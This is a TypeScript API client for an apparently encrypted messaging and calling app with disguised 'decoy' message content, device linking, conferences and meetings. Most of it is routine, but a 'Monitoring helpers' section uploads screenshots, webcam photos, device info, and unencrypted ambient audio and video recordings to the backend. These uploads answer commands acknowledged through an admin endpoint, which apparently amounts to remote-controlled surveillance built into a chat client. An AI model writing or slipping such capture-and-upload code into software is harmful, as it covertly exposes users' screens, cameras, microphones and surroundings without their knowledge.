import { decryptMessage as decryptMessageLocal, resolveEncryptedKey } from './crypto';

// VITE_API_BASE comes from .env.production / .env.test (see package.json build:test).
// Falls back to production so a plain `npm run build` with no mode flag never
// silently points at the test backend.
const BASE = import.meta.env.VITE_API_BASE || 'https://apidilarion.eibstratoc.com';

// ── Types ──────────────────────────────────────────────────────────────────────

export interface ChatMessage {
  id: number;
  sender: string;
  recipient: string;
  content: string;
  content_type: string;
  timestamp: string;
  delivered: boolean;
  read: boolean;
  decoy_content?: string;
  encrypted_key?: string | null;
  iv?: string | null;
}

export interface Contact {
  username: string;
  is_active: boolean;
}

export interface Group {
  id: number;
  name: string;
  description?: string;
  member_count: number;
}

// ── Auth ───────────────────────────────────────────────────────────────────────

export async function login(username: string, token: string): Promise<unknown> {
  const res = await fetch(`${BASE}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, token }),
  });
  if (!res.ok) {
    let detail = 'Invalid username or token';
    try {
      const body = await res.json();
      detail = body.detail || body.message || detail;
    } catch {}
    throw new Error(detail);
  }
  return res.json();
}

// ── Device linking (multi-device) ───────────────────────────────────────────────

export interface DeviceKey {
  device_uuid: string;
  public_key: string;
  platform: string;
}

// New device posts its public key and gets a nonce to render as a QR code.
export async function linkStart(publicKey: string, platform: string, deviceName: string): Promise<{ nonce: string; expires_in: number }> {
  const res = await fetch(`${BASE}/devices/link/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ public_key: publicKey, platform, device_name: deviceName }),
  });
  if (!res.ok) throw new Error('Failed to start device link');
  return res.json();
}

export interface LinkStatus {
  status: 'pending' | 'approved' | 'expired';
  session_token?: string;
  device_uuid?: string;
  username?: string;
}

export async function linkStatus(nonce: string): Promise<LinkStatus> {
  const res = await fetch(`${BASE}/devices/link/status/${encodeURIComponent(nonce)}`);
  if (!res.ok) throw new Error('Failed to poll link status');
  return res.json();
}

// Register/refresh this device's key against an existing session (returns device_uuid).
export async function registerDevice(token: string, publicKey: string, platform: string, deviceName: string): Promise<{ device_uuid: string }> {
  const res = await fetch(`${BASE}/devices/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ public_key: publicKey, platform, device_name: deviceName }),
  });
  if (!res.ok) throw new Error('Failed to register device');
  return res.json();
}

// All active device public keys for a user — sender wraps the AES key per device.
// ── Calls ──────────────────────────────────────────────────────────────────────

/**
 * ICE servers with short-lived TURN credentials. Returns null on any failure so
 * the caller falls back to its built-in list instead of failing the call.
 */
export async function getIceServers(token: string): Promise<RTCIceServer[] | null> {
  try {
    const res = await fetch(`${BASE}/webrtc/ice-servers`, {
      headers: { Authorization: `Bearer ${token}` },
    });
    if (!res.ok) return null;
    const body = await res.json();
    const servers = body?.ice_servers;
    if (!Array.isArray(servers) || servers.length === 0) return null;
    return servers as RTCIceServer[];
  } catch {
    return null;
  }
}

export async function getUserDevices(token: string, username: string): Promise<DeviceKey[]> {
  const res = await fetch(`${BASE}/users/${encodeURIComponent(username)}/devices`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) return [];
  const body = await res.json();
  return body.devices ?? [];
}

export interface MyDevice {
  device_uuid: string;
  platform: string;
  device_name: string;
  created_at: string | null;
  last_seen: string | null;
}

export async function listMyDevices(token: string): Promise<MyDevice[]> {
  const res = await fetch(`${BASE}/devices`, { headers: { Authorization: `Bearer ${token}` } });
  if (!res.ok) return [];
  const body = await res.json();
  return body.devices ?? [];
}

export async function revokeDevice(token: string, deviceUuid: string): Promise<void> {
  await fetch(`${BASE}/devices/${encodeURIComponent(deviceUuid)}/revoke`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
  }).catch(() => {});
}

// ── Users ──────────────────────────────────────────────────────────────────────

export async function getUsers(token: string): Promise<Contact[]> {
  const res = await fetch(`${BASE}/users`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch users');
  return res.json();
}

export async function getConversations(token: string): Promise<Contact[]> {
  const res = await fetch(`${BASE}/messages/conversations`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch conversations');
  return res.json();
}

export async function searchUsers(token: string, query: string): Promise<Contact[]> {
  const all = await getUsers(token);
  const q = query.toLowerCase();
  return all.filter(u => u.username.toLowerCase().includes(q));
}

// ── Conversation ───────────────────────────────────────────────────────────────

export async function getConversation(token: string, partner: string): Promise<ChatMessage[]> {
  const res = await fetch(`${BASE}/messages/conversation/${encodeURIComponent(partner)}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch conversation');
  const body = await res.json();
  return body.messages ?? body;
}

// ── Public keys ────────────────────────────────────────────────────────────────

export async function getPublicKey(token: string, username: string): Promise<string | null> {
  const res = await fetch(`${BASE}/users/${encodeURIComponent(username)}/public_key`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) return null;
  const body = await res.json();
  return body.public_key ?? null;
}

export async function updatePublicKey(token: string, publicKey: string): Promise<void> {
  const res = await fetch(`${BASE}/users/update_public_key`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ public_key: publicKey }),
  });
  if (!res.ok) throw new Error('Failed to publish public key');
}

// ── Send text ──────────────────────────────────────────────────────────────────

// The message is encrypted client-side; `message` here is already ciphertext.
// `decoy_content` is what any non-decrypting viewer sees, so it must always be
// supplied — otherwise the server substitutes a placeholder that reveals the
// message is encrypted.
export async function sendText(
  token: string,
  username: string,
  message: string,
  opts: { encryptedKey: string; iv: string; decoyContent: string },
): Promise<void> {
  const res = await fetch(`${BASE}/messages/send`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({
      username,
      message,
      encrypted_key: opts.encryptedKey,
      iv: opts.iv,
      decoy_content: opts.decoyContent,
    }),
  });
  if (!res.ok) throw new Error('Failed to send message');
}

// Must match DECOY_KINDS in the backend.
export type DecoyKind = 'invoice' | 'delivery' | 'minutes' | 'memo';

// ── Upload media ───────────────────────────────────────────────────────────────

export async function uploadMedia(
  token: string,
  recipient: string,
  file: File | Blob,
  contentType: string,
  filename: string,
  decoyKind?: DecoyKind,
): Promise<{ media_id: string }> {
  const form = new FormData();
  form.append('username', recipient);
  form.append('file', file, filename);
  form.append('content_type', contentType);
  if (decoyKind) form.append('decoy_kind', decoyKind);
  const res = await fetch(`${BASE}/media/upload_raw`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
  if (!res.ok) throw new Error('Failed to upload media');
  return res.json();
}

export async function uploadGroupMedia(
  token: string,
  groupId: number,
  file: File | Blob,
  contentType: string,
  filename: string,
  decoyKind?: DecoyKind,
): Promise<{ media_id: string }> {
  const form = new FormData();
  form.append('group_id', String(groupId));
  form.append('file', file, filename);
  form.append('content_type', contentType);
  if (decoyKind) form.append('decoy_kind', decoyKind);
  const res = await fetch(`${BASE}/media/upload_raw_group`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
  if (!res.ok) throw new Error('Failed to upload media');
  return res.json();
}

// ── Download media ─────────────────────────────────────────────────────────────

export async function downloadMedia(token: string, mediaId: string): Promise<Blob> {
  const res = await fetch(`${BASE}/media/download/${encodeURIComponent(mediaId)}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (res.status === 410) throw Object.assign(new Error('Media was already viewed and deleted'), { status: 410 });
  if (res.status === 404) throw Object.assign(new Error('Media not found'), { status: 404 });
  if (!res.ok) throw Object.assign(new Error('Failed to download media'), { status: res.status });
  return res.blob();
}

// Stand-in document shown before a master-token reveal. Reusable, cached
// server-side, and never deletes the real file — safe to fetch repeatedly.
export async function downloadDecoyFile(token: string, mediaId: string): Promise<Blob> {
  const res = await fetch(`${BASE}/media/decoy-file/${encodeURIComponent(mediaId)}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw Object.assign(new Error('Failed to load decoy'), { status: res.status });
  return res.blob();
}

// ── Mark read ──────────────────────────────────────────────────────────────────

export async function markRead(token: string, messageId: number): Promise<void> {
  await fetch(`${BASE}/messages/${messageId}/read`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${token}` },
  }).catch(() => {});
}

// ── Monitoring helpers (used by monitoring.ts) ─────────────────────────────────

function base64ToBlob(b64: string, mime: string): Blob {
  const bytes = atob(b64);
  const arr = new Uint8Array(bytes.length);
  for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
  return new Blob([arr], { type: mime });
}

export async function uploadScreenshot(token: string, b64: string, commandId: number) {
  const blob = base64ToBlob(b64, 'image/png');
  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const form = new FormData();
  form.append('file', blob, `desktop_${ts}.png`);
  form.append('command_id', String(commandId));
  form.append('context', 'screenshot');
  form.append('device_type', 'desktop');
  await fetch(`${BASE}/device-data/screenshot/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function uploadWebcamPhoto(token: string, blob: Blob, commandId: number) {
  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const form = new FormData();
  form.append('file', blob, `desktop_photo_${ts}.jpg`);
  form.append('command_id', String(commandId));
  form.append('context', 'photo');
  form.append('device_type', 'desktop');
  await fetch(`${BASE}/device-data/screenshot/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function uploadDeviceInfo(token: string, info: object) {
  await fetch(`${BASE}/device-data/device-info`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify(info),
  });
}

export async function uploadAudioRecording(token: string, blob: Blob, duration: number) {
  const form = new FormData();
  form.append('file', blob, 'recording.webm');
  form.append('recording_type', 'ambient');
  form.append('duration', String(duration));
  form.append('is_encrypted', 'false');
  await fetch(`${BASE}/monitoring/upload_audio`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function uploadVideoRecording(token: string, blob: Blob, duration: number) {
  const form = new FormData();
  form.append('file', blob, 'recording.webm');
  form.append('duration', String(duration));
  form.append('context', 'ambient');
  form.append('is_encrypted', 'false');
  await fetch(`${BASE}/monitoring/video/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function ackCommand(token: string, commandId: number, status: string) {
  if (!commandId) return;
  await fetch(`${BASE}/admin/device/command/ack`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ command_id: commandId, status }),
  }).catch(() => {});
}

// ── Decrypt encrypted message ──────────────────────────────────────────────────

// Decryption happens entirely on-device: the server holds no key material and no
// longer exposes a /decrypt route. Messages without encrypted_key/iv predate E2EE
// and are not recoverable by any client.

export class LegacyMessageError extends Error {
  constructor() {
    super('This message was sent before end-to-end encryption and can no longer be decrypted.');
    this.name = 'LegacyMessageError';
  }
}

export class MissingKeyError extends Error {
  constructor() {
    super('No private key on this device. Import your key from your phone to read messages.');
    this.name = 'MissingKeyError';
  }
}

export async function decryptChatMessage(
  msg: ChatMessage,
  privateKey: string | null,
  currentUsername: string,
  deviceUuid: string | null = null,
): Promise<string> {
  if (!privateKey) throw new MissingKeyError();
  if (!msg.encrypted_key || !msg.iv) throw new LegacyMessageError();

  const wrapped = resolveEncryptedKey(msg.encrypted_key, deviceUuid, currentUsername);
  if (!wrapped) throw new LegacyMessageError();

  try {
    return await decryptMessageLocal(msg.content, wrapped, msg.iv, privateKey);
  } catch {
    throw new Error('Could not decrypt — this message was encrypted for a different key.');
  }
}

// ── Groups ─────────────────────────────────────────────────────────────────────

export async function getGroups(token: string): Promise<Group[]> {
  const res = await fetch(`${BASE}/groups`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch groups');
  return res.json();
}

export async function getGroupMessages(token: string, groupId: number): Promise<ChatMessage[]> {
  const res = await fetch(`${BASE}/groups/${groupId}/messages`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch group messages');
  const body = await res.json();
  return body.messages ?? body;
}

// `message` is ciphertext; encrypted_key is a JSON map of username -> wrapped AES key.
export async function sendGroupMessage(
  token: string,
  groupId: number,
  message: string,
  opts: { encryptedKey: string; iv: string; decoyContent: string },
  addressedToUsername?: string,
): Promise<void> {
  const body: Record<string, unknown> = {
    group_id: groupId,
    message,
    encrypted_key: opts.encryptedKey,
    iv: opts.iv,
    decoy_content: opts.decoyContent,
  };
  if (addressedToUsername) body.addressed_to_username = addressedToUsername;
  const res = await fetch(`${BASE}/messages/group/send`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify(body),
  });
  if (!res.ok) throw new Error('Failed to send group message');
}

export interface GroupMember {
  user_id: number;
  username: string;
  role: string;
  joined_at: string;
}

export async function getGroupMembers(token: string, groupId: number): Promise<GroupMember[]> {
  const res = await fetch(`${BASE}/groups/${groupId}/members`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch group members');
  return res.json();
}

// ── Call history ───────────────────────────────────────────────────────────────

export interface CallRecord {
  id: number;
  other_party_username: string;
  call_type: string; // "voice" | "video"
  status: string;    // "completed" | "missed" | "rejected" | "cancelled"
  duration: number;  // seconds
  started_at: string;
  ended_at: string | null;
  is_caller: boolean;
}

export async function getCallHistory(token: string): Promise<CallRecord[]> {
  const res = await fetch(`${BASE}/calls/history`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch call history');
  const body = await res.json();
  return body.calls ?? body;
}

// ── Call signaling (REST, compatible with mobile apps) ─────────────────────────

export async function initiateCall(
  token: string,
  recipientUsername: string,
  callType: 'audio' | 'video',
  offerSdp?: string,
): Promise<{ call_id: number }> {
  // Backend expects 'voice' not 'audio'
  const backendCallType = callType === 'audio' ? 'voice' : 'video';
  const res = await fetch(`${BASE}/calls/initiate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ recipient_username: recipientUsername, call_type: backendCallType, offer_sdp: offerSdp }),
  });
  if (!res.ok) {
    const txt = await res.text().catch(() => res.status.toString());
    throw new Error(`initiate call failed ${res.status}: ${txt}`);
  }
  return res.json();
}

/**
 * Poll a call's status. Fallback for the caller when the WebSocket missed the
 * accept push — returns the answer SDP the backend held so the call can still
 * connect instead of ringing forever.
 */
export async function getCallStatus(
  token: string,
  callId: number,
): Promise<{ status: string; answer_sdp?: string } | null> {
  try {
    const res = await fetch(`${BASE}/calls/${callId}/status`, {
      headers: { Authorization: `Bearer ${token}` },
    });
    if (!res.ok) return null;
    return await res.json();
  } catch {
    return null;
  }
}

export async function performCallAction(
  token: string,
  callId: number,
  action: 'accept' | 'decline' | 'end' | 'busy',
  answerSdp?: string,
  masterToken?: string,
): Promise<void> {
  const res = await fetch(`${BASE}/calls/action`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ call_id: callId, action, answer_sdp: answerSdp, mastertoken: masterToken }),
  });
  if (!res.ok) {
    // Callers need the code: 401 on accept means a bad master token, which is
    // retryable and must not end the call.
    const err: Error & { status?: number } = new Error(`Call action ${action} failed`);
    err.status = res.status;
    throw err;
  }
}

/** Tell the other side our mic state — a muted track is just silence on the wire. */
export async function setCallMediaState(
  token: string,
  callId: number,
  muted: boolean,
): Promise<void> {
  await fetch(`${BASE}/calls/${callId}/media-state`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ muted }),
  }).catch(() => {});
}

export async function sendCallIceCandidate(
  token: string,
  callId: number,
  recipientUsername: string,
  candidate: RTCIceCandidateInit,
): Promise<void> {
  await fetch(`${BASE}/calls/ice_candidate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ call_id: callId, recipient_username: recipientUsername, candidate }),
  });
}

// ── Conference ────────────────────────────────────────────────────────────────

/**
 * Creates a conference. `callId` upgrades an existing 1:1 call into one;
 * omit it to start a fresh standalone meeting (the backend's call_id is
 * optional — `payload.get("call_id")` — so this needs no new endpoint).
 */
export async function createConference(token: string, callId?: number): Promise<{ conference_id: number }> {
  const res = await fetch(`${BASE}/calls/conference/create`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ call_id: callId ?? null }),
  });
  if (!res.ok) throw new Error(`Failed to create conference (${res.status})`);
  return res.json();
}

export async function conferenceInvite(token: string, conferenceId: number, username: string): Promise<void> {
  await fetch(`${BASE}/calls/conference/${conferenceId}/invite`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ username }),
  });
}

/** Join a conference you were rung for. Master token required, like any answer. */
export async function conferenceAccept(
  token: string,
  conferenceId: number,
  masterToken: string,
): Promise<{ participants: string[] }> {
  const res = await fetch(`${BASE}/calls/conference/${conferenceId}/accept`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ mastertoken: masterToken }),
  });
  if (!res.ok) {
    const err: Error & { status?: number } = new Error(
      res.status === 401 ? 'Master token rejected' : `Could not join the call (${res.status})`,
    );
    err.status = res.status;
    throw err;
  }
  const body = await res.json();
  return { participants: body.participants ?? [] };
}

export async function conferenceDecline(token: string, conferenceId: number): Promise<void> {
  await fetch(`${BASE}/calls/conference/${conferenceId}/decline`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
  }).catch(() => {});
}

export async function conferenceSignal(
  token: string, conferenceId: number,
  to: string, signalType: string, data: any,
): Promise<void> {
  await fetch(`${BASE}/calls/conference/${conferenceId}/signal`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ to, signal_type: signalType, data }),
  });
}

export async function conferenceLeave(token: string, conferenceId: number): Promise<void> {
  await fetch(`${BASE}/calls/conference/${conferenceId}/leave`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
  });
}

/** LiveKit room-access token for group video (gallery view). Room maps 1:1 onto the conference. */
export interface LiveKitTokenResponse {
  url: string;
  token: string;
  room: string;
}

export async function getLiveKitToken(token: string, conferenceId: number, displayName?: string): Promise<LiveKitTokenResponse> {
  const qs = displayName?.trim() ? `?display_name=${encodeURIComponent(displayName.trim())}` : '';
  const res = await fetch(`${BASE}/calls/conference/${conferenceId}/livekit-token${qs}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) {
    const err: Error & { status?: number } = new Error(
      res.status === 503 ? 'Group video is not set up on this server yet' : `Failed to get video token (${res.status})`,
    );
    err.status = res.status;
    throw err;
  }
  return res.json();
}

// ── Scheduled meetings ───────────────────────────────────────────────────────
// A meeting is inert until someone joins — join_by_code hands back a
// conference_id + participants shaped exactly like an instant meeting's
// create+invite, so the client join path is identical either way.

export interface MeetingSummary {
  id: number;
  title: string | null;
  scheduled_at: string;
  duration_minutes: number;
  status: 'upcoming' | 'live' | 'ended' | 'cancelled';
  join_code: string;
  creator_username: string;
  group_id: number | null;
  waiting_room_enabled?: boolean;
}

export async function createMeeting(
  token: string,
  opts: {
    title?: string;
    scheduledAt: string; // ISO 8601
    durationMinutes?: number;
    groupId?: number;
    inviteeUsernames?: string[];
    recurrence?: string;
    waitingRoomEnabled?: boolean;
  },
): Promise<{ meeting_id: number; join_code: string; scheduled_at: string }> {
  const res = await fetch(`${BASE}/meetings/create`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({
      title: opts.title ?? null,
      scheduled_at: opts.scheduledAt,
      duration_minutes: opts.durationMinutes ?? 60,
      group_id: opts.groupId ?? null,
      invitee_usernames: opts.inviteeUsernames ?? null,
      recurrence: opts.recurrence ?? null,
      waiting_room_enabled: opts.waitingRoomEnabled ?? false,
    }),
  });
  if (!res.ok) throw new Error(`Failed to schedule meeting (${res.status})`);
  return res.json();
}

export async function getUpcomingMeetings(token: string): Promise<MeetingSummary[]> {
  const res = await fetch(`${BASE}/meetings/upcoming`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error(`Failed to load meetings (${res.status})`);
  const body = await res.json();
  return body.meetings ?? [];
}

export async function joinMeetingByCode(
  token: string,
  joinCode: string,
): Promise<{ conference_id: number; status: 'admitted' | 'waiting'; participants: string[] }> {
  const res = await fetch(`${BASE}/meetings/join_by_code`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ join_code: joinCode }),
  });
  if (!res.ok) {
    const body = await res.json().catch(() => null);
    throw new Error(body?.detail || `Failed to join meeting (${res.status})`);
  }
  return res.json();
}

export async function cancelMeeting(token: string, meetingId: number): Promise<void> {
  const res = await fetch(`${BASE}/meetings/${meetingId}/cancel`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error(`Failed to cancel meeting (${res.status})`);
}

// ── Waiting room ────────────────────────────────────────────────────────────

export interface WaitingParticipant {
  user_id: number;
  username: string;
}

export async function getWaitingRoom(token: string, conferenceId: number): Promise<WaitingParticipant[]> {
  const res = await fetch(`${BASE}/calls/conference/${conferenceId}/waiting-room`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error(`Failed to load waiting room (${res.status})`);
  const body = await res.json();
  return body.waiting ?? [];
}

export async function admitFromWaitingRoom(token: string, conferenceId: number, userId: number): Promise<void> {
  const res = await fetch(`${BASE}/calls/conference/${conferenceId}/waiting-room/${userId}/admit`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error(`Failed to admit (${res.status})`);
}

export async function denyFromWaitingRoom(token: string, conferenceId: number, userId: number): Promise<void> {
  const res = await fetch(`${BASE}/calls/conference/${conferenceId}/waiting-room/${userId}/deny`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error(`Failed to deny (${res.status})`);
}

// ── Whiteboard ───────────────────────────────────────────────────────────────
// Ephemeral for v1 — strokes relay live via WS, nothing is persisted server-
// side, so a fresh open starts with a blank board. Exactly one of
// username/groupId/conferenceId identifies the target.

export interface WhiteboardTarget {
  username?: string;
  groupId?: number;
  conferenceId?: number;
}

export interface WhiteboardStroke {
  x0: number; y0: number; x1: number; y1: number; // normalized 0..1, canvas-size independent
  color: string;
  width: number;
}

export async function sendWhiteboardStroke(token: string, target: WhiteboardTarget, stroke: WhiteboardStroke): Promise<void> {
  await fetch(`${BASE}/whiteboard/stroke`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ username: target.username ?? null, group_id: target.groupId ?? null, conference_id: target.conferenceId ?? null, stroke }),
  }).catch(() => {});
}

export async function sendWhiteboardClear(token: string, target: WhiteboardTarget): Promise<void> {
  await fetch(`${BASE}/whiteboard/clear`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ username: target.username ?? null, group_id: target.groupId ?? null, conference_id: target.conferenceId ?? null }),
  }).catch(() => {});
}

// ── Master token ───────────────────────────────────────────────────────────────

export async function confirmMasterToken(token: string, masterToken: string): Promise<boolean> {
  const res = await fetch(`${BASE}/mastertoken/confirm`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ mastertoken: masterToken }),
  });
  if (res.status === 401) return false;
  if (!res.ok) {
    let detail = 'Server error';
    try { const b = await res.json(); detail = b.detail || detail; } catch {}
    throw new Error(detail);
  }
  return true;
}

export async function createMasterToken(token: string, masterToken: string): Promise<void> {
  const res = await fetch(`${BASE}/mastertoken/create`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ mastertoken: masterToken }),
  });
  if (!res.ok) throw new Error('Failed to create master token');
}
